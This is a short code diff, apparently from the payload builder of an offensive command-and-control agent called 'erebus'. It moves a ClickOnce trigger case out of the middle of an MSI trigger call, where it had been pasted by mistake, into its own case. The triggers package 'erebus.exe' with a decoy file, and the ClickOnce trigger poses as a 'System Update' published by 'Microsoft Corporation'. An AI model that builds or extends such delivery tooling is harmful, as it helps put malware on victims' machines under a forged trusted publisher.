@@ -1677,20 +1677,18 @@ generated if none have been entered.""",
 
                         case "MSI":
                             trigger_path= create_msi_payload_trigger(
-
-                                                        case "ClickOnce":
-                                                            trigger_path = await create_clickonce_trigger(
-                                                                payload_exe="erebus.exe",
-                                                                payload_dir=payload_dir,
-                                                                decoy_file=decoy_file,
-                                                                app_name="System Update",
-                                                                app_publisher="Microsoft Corporation"
-                                                            )
                                 payload_exe="erebus.exe",
                                 payload_dir=payload_dir,
                                 decoy_file=decoy_file
                             )
-
+                        case "ClickOnce":
+                            trigger_path = await create_clickonce_trigger(
+                                payload_exe="erebus.exe",
+                                payload_dir=payload_dir,
+                                decoy_file=decoy_file,
+                                app_name="System Update",
+                                app_publisher="Microsoft Corporation"
+                            )
 
                     if trigger_path:
                         response.status = BuildStatus.Success
